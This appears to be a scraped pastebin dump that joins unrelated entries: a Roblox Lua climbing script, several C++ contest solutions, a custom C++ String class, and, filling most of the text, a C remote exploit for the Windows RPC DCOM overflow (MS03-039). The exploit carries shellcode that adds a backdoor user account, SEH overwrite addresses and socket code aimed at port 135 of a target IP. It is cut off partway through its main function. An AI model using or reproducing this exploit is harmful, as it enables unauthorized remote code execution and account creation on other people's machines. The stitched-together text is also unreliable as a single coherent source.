local HumRootPart = script.Parent:WaitForChild(""HumanoidRootPart"")
local humanoid = script.Parent:WaitForChild(""Humanoid"")
local char = script.parent
local part = nil

local ClimbAnimation = humanoid:LoadAnimation(char.Animate.climb.ClimbAnim)

game:GetService(""RunService"").Heartbeat:Connect(function()
        local params = RaycastParams.new()
  		params.FilterDescendantsInstances = {char}
        
        if char:FindFirstChild(""LeftFoot"") then --checking if player is R15
            local result = workspace:Raycast(char.LeftFoot.Position, HumRootPart.CFrame.LookVector * 1.5, params)
            part = result and result.Instance or nil
        else
            local result = workspace:Raycast(char[""Left Leg""].Position, HumRootPart.CFrame.LookVector * 1.5, params)
            part = result and result.Instance or nil
        end
        
        if part then
        	HumRootPart.Velocity = Vector3.new(HumRootPart.Velocity.X, 15, HumRootPart.Velocity.Z) --15 is speed
            if humanoid:GetState() ~= Enum.HumanoidStateType.Climbing then
            	humanoid:ChangeState(Enum.HumanoidStateType.Climbing)
            end
            
            if not ClimbAnimation.IsPlaying then
            	ClimbAnimation:Play()
            end
            
        else
            ClimbAnimation:Stop()
        end
end)"
YGrwabc1,различные числа (Мо),ke_timofeeva7,C++,Saturday 2nd of March 2024 05:00:17 AM CDT,"#include <iostream>
#include <string>
#include <sstream>
#include <vector>
#include <cmath>
#include <algorithm>
#include <memory.h>
#include <stdio.h>
#include <stack>
#include <deque>
#include <queue>
#include <set>
#include <iterator>
#include <map>
#include <iomanip>
#include <unordered_map>
#include <unordered_set>
#include <array>
//#define int long long
#define pb push_back
#define fir first
#define sec second
#define double long double
#define endl ""\n""
#define un unsigned
#define INF 1000000000009
#define EPS 0.000000000001
#define pii pair<int, int>
#define all(v) v.begin(), v.end()
using namespace std;

const int N = 1000009, R = 1 << 20, logn = 19, ABC = 26, BUBEN = 350;

struct S {
    int first, second, id;
    S(int a, int b, int c) : fir(a), sec(b), id(c) {}
    S() {}
};

bool cmp(S a, S b) {
    if (a.first / BUBEN == b.first / BUBEN)
        return a.second < b.second;
    return a.first < b.first;
}

signed main() {
    ios_base::sync_with_stdio(false);
    cin.tie(0);
    cout.tie(0);

    int n;
    cin >> n;

    vector<int> vc(n);

    for (int& i : vc)
        cin >> i;

    vector<int> a = vc;
    sort(all(a));
    a.erase(unique(all(a)), a.end());

    for (int i = 0; i < n; i++)
        vc[i] = lower_bound(all(a), vc[i]) - a.begin();

    int q;
    cin >> q;

    vector<S> query(q);
    int id = 0;
    for (auto& i : query) {
        cin >> i.first >> i.second;
        i.id = id;
        id++;
    }
    sort(all(query), cmp);

    int pr = -1;
    int ll = -1, rr = -1;
    vector<int> cnt(a.size());
    vector<int> ans(q);
    int answer = 0;
    for (int i = 0; i < q; i++) {
        int l = query[i].first, r = query[i].second;
        l--;
        r--;
        if (pr == -1) {            
            for (int j = l; j <= r; j++) {
                cnt[vc[j]]++;
                if (cnt[vc[j]] == 1)
                    answer++;
            }
            ll = l;
            rr = r;
            pr = 0;
        }
        else {
            while (ll > l) {
                ll--;
                cnt[vc[ll]]++;
                if (cnt[vc[ll]] == 1)
                    answer++;
            }
            while (rr < r) {
                rr++;
                cnt[vc[rr]]++;
                if (cnt[vc[rr]] == 1)
                    answer++;
            }

            while (ll < l) {
                cnt[vc[ll]]--;
                if (cnt[vc[ll]] == 0)
                    answer--;
                ll++;
            }
            while (rr > r) {
                cnt[vc[rr]]--;
                if (cnt[vc[rr]] == 0)
                    answer--;
                rr--;
            }
        }
        ans[query[i].id] = answer;
    }
    for (int i : ans)
        cout << i << endl;
    return 0;
}"
LBNyf507,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 04:59:00 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int n, q;
    cin >> n >> q;
    int niza[n];
    int idx[55];
    for(int i = 1; i <= 50; i++) {
        idx[i] = 0;
    }
    for(int i = 0; i < n; i++) {
        cin >> niza[i];
        if(idx[niza[i]] == 0) {
            idx[niza[i]] = i + 1;
        }
    }
    for(int i = 0; i < q; i++) {
        int x;
        cin >> x;
        cout << idx[x] << "" "";
        for(int j = 1; j <= 50; j++) {
            if(idx[j] < idx[x] and idx[j] != 0) {
                idx[j]++;
            }
        }
        idx[x] = 1;
        
    }
    return 0;
}

//n = 27 - 4 = 23
// 89 145 42 20 4 16 37 58
// 23 % 8 = 7
"
1RinUzJS,Untitled,35657,C++,Saturday 2nd of March 2024 04:55:18 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

class String {

public:

	String() : size_(0), capacity_(15), str_(new char[capacity_]) {
		total_number_string_++;
	}

	explicit String(const int string_capacity) : size_(0), capacity_(string_capacity), str_(new char[capacity_]) {
		total_number_string_++;
	} // здесь ставим explicit во избежание неявного приведения int к string

	String(const char* new_string) : size_(strlen(new_string)), capacity_(size_ + 1), str_(new char[capacity_]) {
		strcpy(str_, new_string);
		total_number_string_++;
	} // здесь explicit можно не ставить чтобы иметь возможность преобразовать символьный массив к String

	String(const String& other) : size_(other.size_), capacity_(other.capacity_), str_(new char[capacity_]) {
		strcpy(str_, other.str_);
		total_number_string_++;
	}

	String(String&& other) : size_(other.size_), capacity_(other.capacity_), str_(other.str_) {
		other.str_ = nullptr;
		other.size_ = 0;
		other.capacity_ = 0;
		total_number_string_++;
	}

	String& operator=(const String& other) {
		if (&other != this) { // проверка на самоприсваивание
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] str_;
			str_ = new char[capacity_];
			strcpy(str_, other.str_);
		}
		return *this;
	} // переопределение копирующего оператора присваивания для String

	String& operator=(String&& other) {
		if (&other != this) { // проверка на самоприсваивание
			size_ = other.size_;
			capacity_ = other.capacity_;
			delete[] str_;
			str_ = other.str_;
			other.str_ = nullptr;
			other.size_ = 0;
			other.capacity_ = 0;
		}
		return *this;
	} // переопределение перемещающего оператора присваивания для String

	String& operator=(const char* str) {
        size_ = strlen(str);
        capacity_ = size_ + 1;
        delete[] str_;
        str_ = new char[capacity_];
        strcpy(str_, str);
        return *this;
    } // переопределение копирующего оператора присваивания для строкового литерала

	const char* get_string() const {
		return str_;
	}


	int size() const {
		return size_;
	}

	int capacity() const {
		return capacity_;
	}

	bool operator==(const String& other) const {
		return !strcmp(str_, other.str_);
	}

	bool operator!=(const String& other) const {
		return strcmp(str_, other.str_);
	}

	char& operator[](const int index) {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return str_[index];
	}

	char operator[](const int index) const {
		if (index < 0 || index >= size_) {
			cout << ""Некорректный индекс"" << endl;
		}
		return str_[index];
	}

	static int get_total_number_strings() {
		return total_number_string_;
	}

	~String() {
		delete[] str_;
		total_number_string_--;
	}


private:
	int size_;
	int capacity_;
	char* str_;
	static int total_number_string_;
};

ostream& operator<<(ostream& output, const String& string) {
	output << string.get_string();
	return output;
} // переопределение оператора вывода в поток

istream& operator>>(istream& input, String& string) {
	int capacity = 15;
	int i = 0;
	char* str = new char[capacity];
	char ch;
	while (ch = input.get()) {
		if (ch == ' ' || ch == '\n') {
			break;
		}
		if (i == capacity - 1) {
			char* temp = new char[capacity *= 2];
			for (int j = 0; j < i; j++) {
				temp[j] = str[j];
			}
			delete[] str;
			str = temp;
		}
		str[i] = ch;
		i++;
	}
	str[i] = '\0';
	string = str;
	return input;
} // переопределение оператора чтения из потока



int String::total_number_string_ = 0;

int main() {
	setlocale(LC_ALL, ""ru"");

	String str1;

	String str2(30);

	cout << String::get_total_number_strings() << endl;

	String str3(""Привет"");

	cout << str3 << endl;

	str3 = ""Новая строка"";

	cout << str3 << endl;

	str1 = ""Еще одна новая строка"";

	cout << str1 << endl;

	String str4(str3);

	cout << str3 << endl;

	cout << str4 << endl;

	cout << (str1 == str4) << endl;
	cout << (str3 == str4) << endl;
	cout << (str1 != str4) << endl;
	cout << (str3 != str4) << endl;

	String str5;
	str5 = str1;
	cout << str5 << endl;
	str5 = str5;
	str5[0] = 'Т';
	cout << str5 << endl;

	String str7 = ""Привет"";

	cout << str7[0] << endl;

	cout << str7 << endl;

	String str8;
	str8 = move(str7);
}
"
EjUdxLXy,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 04:36:38 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    
    int niza[200], j = 0;
    for(int i = 0; i < 100; i++) {
        int tmp = p;
        int sum = 0;
        while(tmp > 0) {
            int cifra = tmp % 10;
            cifra *= cifra;
            sum += cifra;
            
            tmp /= 10;
        }
        if(i == n) {
            cout << p << endl;
            return 0;
        }
        niza[j] = p;
        j++;
        p = sum;
    }
    int povtoruvanja[200], o = 0;
    for(int i = 0; i < j; i++) {
        int se_povtoruva = -1;
        for(int k = i + 1; k < j; k++) {
            if(niza[i] == niza[k]) {
                se_povtoruva = k - 1;
                break;
            }
        }
        if(se_povtoruva != -1) {
            n -= i;
            for(int k = i; k <= se_povtoruva; k++) {
                povtoruvanja[o] = niza[k];
                o++;
            }
            break;
        }
    }
    
    if(n % o == 0) {
        cout << povtoruvanja[0] << endl;
    }
    else {
        cout << povtoruvanja[n % o] << endl;
    }
    return 0;
}

//n = 27 - 4 = 23
// 89 145 42 20 4 16 37 58
// 23 % 8 = 7
"
kxPzHUnS,Untitled,Josif_tepe,C++,Saturday 2nd of March 2024 04:16:33 AM CDT,"#include <iostream>
#include <cmath>
using namespace std;
int main() {
    int p, n;
    cin >> p >> n;
    
    for(int i = 0; i < n; i++) {
        int tmp = p;
        int sum = 0;
        while(tmp > 0) {
            int cifra = tmp % 10;
            cifra *= cifra;
            sum += cifra;
            
            tmp /= 10;
        }
        p = sum;
    }
    cout << p << endl;
    return 0;
}

"
vEWmCfb0,Microsoft Windows - 'RPC DCOM2' Remote (MS03-039) - CVE-2003-0605,FlyFar,C,Saturday 2nd of March 2024 03:48:43 AM CDT,"/*
        RPCDCOM2.c  ver1.1
        copy by FLASHSKY flashsky at xfocus.org  2003.9.14
   */
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>
#include <process.h>
#include <string.h>
#include <winbase.h>

unsigned char bindstr[]={
0x05,0x00,0x0B,0x03,0x10,0x00,0x00,0x00,0x48,0x00,0x00,0x00,0x7F,0x00,0x00,0x00,
0xD0,0x16,0xD0,0x16,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x01,0x00,
0xa0,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,
0x04,0x5D,0x88,0x8A,0xEB,0x1C,0xC9,0x11,0x9F,0xE8,0x08,0x00,
0x2B,0x10,0x48,0x60,0x02,0x00,0x00,0x00};

unsigned char request1[]={
0x05,0x00,0x00,0x03,0x10,0x00,0x00,0x00,0xE8,0x03
,0x00,0x00,0xE5,0x00,0x00,0x00,0xD0,0x03,0x00,0x00,0x01,0x00,0x04,0x00,0x05,0x00
,0x06,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x32,0x24,0x58,0xFD,0xCC,0x45
,0x64,0x49,0xB0,0x70,0xDD,0xAE,0x74,0x2C,0x96,0xD2,0x60,0x5E,0x0D,0x00,0x01,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x70,0x5E,0x0D,0x00,0x02,0x00,0x00,0x00,0x7C,0x5E
,0x0D,0x00,0x00,0x00,0x00,0x00,0x10,0x00,0x00,0x00,0x80,0x96,0xF1,0xF1,0x2A,0x4D
,0xCE,0x11,0xA6,0x6A,0x00,0x20,0xAF,0x6E,0x72,0xF4,0x0C,0x00,0x00,0x00,0x4D,0x41
,0x52,0x42,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00
,0x00,0x00,0xA8,0xF4,0x0B,0x00,0x60,0x03,0x00,0x00,0x60,0x03,0x00,0x00,0x4D,0x45
,0x4F,0x57,0x04,0x00,0x00,0x00,0xA2,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
,0x00,0x00,0x00,0x00,0x00,0x46,0x38,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00
,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00,0x00,0x00,0x30,0x03,0x00,0x00,0x28,0x03
,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0xC8,0x00
,0x00,0x00,0x4D,0x45,0x4F,0x57,0x28,0x03,0x00,0x00,0xD8,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x02,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xC4,0x28,0xCD,0x00,0x64,0x29
,0xCD,0x00,0x00,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0xB9,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAB,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA5,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA6,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xA4,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAD,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0xAA,0x01,0x00,0x00,0x00,0x00
,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x07,0x00,0x00,0x00,0x60,0x00
,0x00,0x00,0x58,0x00,0x00,0x00,0x90,0x00,0x00,0x00,0x40,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x78,0x00,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x50,0x00,0x00,0x00,0x4F,0xB6,0x88,0x20,0xFF,0xFF
,0xFF,0xFF,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x48,0x00,0x00,0x00,0x07,0x00,0x66,0x00,0x06,0x09
,0x02,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x10,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x78,0x19,0x0C,0x00,0x58,0x00,0x00,0x00,0x05,0x00,0x06,0x00,0x01,0x00
,0x00,0x00,0x70,0xD8,0x98,0x93,0x98,0x4F,0xD2,0x11,0xA9,0x3D,0xBE,0x57,0xB2,0x00
,0x00,0x00,0x32,0x00,0x31,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x80,0x00
,0x00,0x00,0x0D,0xF0,0xAD,0xBA,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x18,0x43,0x14,0x00,0x00,0x00,0x00,0x00,0x60,0x00
,0x00,0x00,0x60,0x00,0x00,0x00,0x4D,0x45,0x4F,0x57,0x04,0x00,0x00,0x00,0xC0,0x01
,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x3B,0x03
,0x00,0x00,0x00,0x00,0x00,0x00,0xC0,0x00,0x00,0x00,0x00,0x00,0x00,0x46,0x00,0x00
,0x00,0x00,0x30,0x00,0x00,0x00,0x01,0x00,0x01,0x00,0x81,0xC5,0x17,0x03,0x80,0x0E
,0xE9,0x4A,0x99,0x99,0xF1,0x8A,0x50,0x6F,0x7A,0x85,0x02,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x01,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x30,0x00
,0x00,0x00,0x78,0x00,0x6E,0x00,0x00,0x00,0x00,0x00,0xD8,0xDA,0x0D,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x2F,0x0C,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x03,0x00,0x00,0x00,0x46,0x00
,0x58,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x10,0x00
,0x00,0x00,0x30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00
,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00
,0x00,0x00,0x00,0x00,0x00,0x00};

unsigned char request2[]={
0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00
,0x00,0x00,0x5C,0x00,0x5C,0x00};

unsigned char request3[]={
0x46,0x00,0x43,0x00,0x24,0x00,0x46,0x00,
0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00
,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00
,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};



unsigned char sccnsp3sp4[]=
    ""\x6C\x00\x6F\x00\x63\x00\x61\x00\x6C\x00\x68\x00""
    ""\x6F\x00\x73\x00\x74\x00\x5C\x00\x43\x00\x24\x00\x5C\x00""

    ""\x58\x00\xeb\x3c\x46\x00\x46\x00\xeb\x7c\x46\x00\x46\x00\x38\x6e""
    ""\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""
    ""\xeb\x1e\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""
    ""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xeb\x06\xf1\xe1\xf2\xe1\xea\xd2""    

//SHELLCODE From  SAM ,THANKs !
//Add user SST,password is 557,
""\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x4D\x01\x80\x34\x0A\x99\xE2\xFA""
""\xEB\x05\xE8\xEB\xFF\xFF\xFF""

""\x70\xDA\x98\x99\x99\xCC\x12\x75\x18\x75\x19\x99\x99\x99\x12\x6D""
""\x71\x92\x98\x99\x99\x10\x9F\x66\xAF\xF1\x01\x67\x13\x97\x71\x3C""
""\x99\x99\x99\x10\xDF\x95\x66\xAF\xF1\xE7\x41\x7B\xEA\x71\x0F\x99""
""\x99\x99\x10\xDF\x89\xFD\x38\x81\x99\x99\x99\x12\xD9\xA9\x14\xD9""
""\x81\x22\x99\x99\x8E\x99\x10\x81\xAA\x59\xC9\xF3\xFD\xF1\xB9\xB6""
""\xF8\xFD\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED""
""\xB9\x12\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xB9\xAC\xAC\xAE""
""\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED\xB9\x12""
""\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xFD\xFD\x99\x99\xF1\xED""
""\xB9\xB6\xF8\xF1\xEA\xB9\xEA\xEA\xF1\xF8\xED\xF6\xEB\xF1\xF0\xEA""
""\xED\xEB\xF1\xFD\xF4\xF0\xF7\xF1\xEC\xE9\xB9\xF8\xF1\xF5\xFE\xEB""
""\xF6\xF1\xF5\xF6\xFA\xF8\xF1\xF7\xFC\xED\xB9\x12\x55\xC9\xC8\x66""
""\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12\xF5\xBD\x81""
""\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12\xC3\xB9\x9A""
""\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA\x59\x35\xA3""
""\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD\x8D\xEC\x78""
""\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D""
""\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2\x5B\x9D\x99""
""\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12\xD9\x95\x12""
""\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31\x21\x99\x99""
""\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\x21\x67\x66\x66""

    ""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""
    ""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""
    ""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""
    ""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""
    ""\x7f\x19\x95\xd5\x17\x53\xe6\x6a""
    ""\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""
    ""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50\x90\x90\x90""     //
    ""\x90\x90\x90\x90\x90\x90\x90\x90""
    ""\x77\xe0\x43\x00\x00\x10\x5c\x00""
    ""\xeb\x1e\x01\x00""//     FOR CN SP3/SP4+-MS03-26
    ""\x4C\x14\xec\x77""//    TOP SEH FOR cn w2k+SP4,must modify to SEH of your target's os 


//FILL BYTE,so sizeof(UNC)>0X400(0X80*8),why? You can read more form  my artic 
//""Utilization of released heap structure and exploit of universal Heap overflow in windows "".
""\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x90\x02\x80\x34\x0A\x99\xE2\xFA""
""\xEB\x05\xE8\xEB\xFF\xFF\xFF""
""\xC7\x5F\x9D\xBD\xDD\x14\xDD\xBD\xDD\xC9\x14\xDD\xBD\x9D\xC9\x14""
""\x1D\xBD\x1D\x99\x99\x99\xC9\x14\x1D\xBD\x0D\x99\x99\x99\xC9\xAA""
""\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\x2D\x99\x99\x99\xC9\x66\xCF""
""\x95\x14\xD5\xBD\xDD\x14\x8D\xBD\xAA\x59\xC9\xF1\xAC\x99\xAE\x99""
""\xF1\xB9\x99\xAC\x99\xF1\xEA\x99\xED\x99\xF1\xB9\x99\xEA\x99\xF1""
""\xFC\x99\xEB\x99\xF1\xEC\x99\xEA\x99\xF1\xED\x99\xB9\x99\xF1\xF7""
""\x99\xFC\x99\x12\x45\xC8\xCB\xC8\xCB\x14\x1D\xBD\x29\x99\x99\x99""
""\xC9\x14\x1D\xBD\x59\x99\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA""
""\x14\x1D\xBD\x79\x99\x99\x99\xC9\x66\xCF\x95\xC3\xC0\xAA\x59\xC9""
""\xF1\xFD\x99\xFD\x99\xF1\xB6\x99\xF8\x99\xF1\xED\x99\xB9\x99\xF1""
""\xEA\x99\xEA\x99\xF1\xEA\x99\xB9\x99\xF1\xF6\x99\xEB\x99\xF1\xF8""
""\x99\xED\x99\xF1\xED\x99\xEB\x99\xF1\xF0\x99\xEA\x99\xF1\xF0\x99""
""\xF7\x99\xF1\xFD\x99\xF4\x99\xF1\xB9\x99\xF8\x99\xF1\xEC\x99\xE9""
""\x99\xF1\xEB\x99\xF6\x99\xF1\xF5\x99\xFE\x99\xF1\xFA\x99\xF8\x99""
""\xF1\xF5\x99\xF6\x99\xF1\xED\x99\xB9\x99\xF1\xF7\x99\xFC\x99\x12""
""\x45\xC8\xCB\x14\x1D\xBD\x61\x99\x99\x99\xC9\x14\x1D\xBD\x91\x98""
""\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\xB1\x98\x99""
""\x99\xC9\x66\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12""
""\xF5\xBD\x81\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12""
""\xC3\xB9\x9A\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA""
""\x59\x35\xA3\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD""
""\x8D\xEC\x78\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A""
""\x44\x12\x9D\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2""
""\x5B\x9D\x99\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12""
""\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31""
""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\xEC\x64\x66\x66""

""\x04\x04\x00\x70\x00\x04\x40""
""\x00\x10\x5c\x00\x78\x01\x07\x00\x78\x01\x07\x00\xa0\x04\x00""

""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71"";


unsigned char request4[]={
0x01,0x10
,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00
,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C
,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00
};

void main(int argc,char ** argv)
{
    WSADATA WSAData;
    SOCKET sock;
    int len,len1;
    SOCKADDR_IN addr_in;
    short port=135;
    unsigned char buf1[0x1000];
    unsigned char buf2[0x1000];

    printf(""RPC DCOM overflow Vulnerability discoveried by NSFOCUS\n"");
    printf(""Code by FlashSky,Flashsky xfocus org\n"");
    printf(""Welcome to our Site: http://www.xfocus.org\n"");
    printf(""Welcome to our Site: http://www.venustech.com.cn\n"");
    if(argc!=2)
    {
        printf(""%s targetIP \n"",argv[0]);
        printf(""for cn w2k server sp3/sp4+ms03-26\n"");
    }
    
    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)
    {
        printf(""WSAStartup error.Error:%d\n"",WSAGetLastError());
        return;
    }

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(port);
    addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);
    
    if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        printf(""Socket failed.Error:%d\n"",WSAGetLastError());
        return;
    }
    len1=sizeof(request1);
    len=sizeof(sccnsp3sp4);

    if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
    {
        printf(""Connect failed.Error:%d"",WSAGetLastError());
        return;
    }
    memcpy(buf2,request1,sizeof(request1));
    *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sccnsp3sp4)/2;  
    *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sccnsp3sp4)/2;
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);
    memcpy(buf2+len1,sccnsp3sp4,sizeof(sccnsp3sp4));
    len1=len1+sizeof(sccnsp3sp4);
    memcpy(buf2+len1,request3,sizeof(request3));
    len1=len1+sizeof(request3);
    memcpy(buf2+len1,request4,sizeof(request4));
    len1=len1+sizeof(request4);
    *(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+len-0xc;

    *(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+len-0xc;  
    *(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+len-0xc;
    *(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+len-0xc;
    *(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+len-0xc;
    *(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+len-0xc;
    *(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+len-0xc;
